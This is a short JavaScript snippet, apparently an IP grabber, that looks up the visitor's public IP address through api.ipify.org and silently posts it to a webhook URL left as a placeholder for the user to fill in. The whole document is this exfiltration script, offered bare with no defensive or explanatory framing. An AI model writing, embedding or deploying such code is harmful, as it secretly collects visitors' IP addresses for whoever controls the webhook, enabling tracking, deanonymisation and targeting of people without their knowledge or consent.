var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'YOUR WEBHOOK THERE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
    var message = {
        content: 'IP:' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});
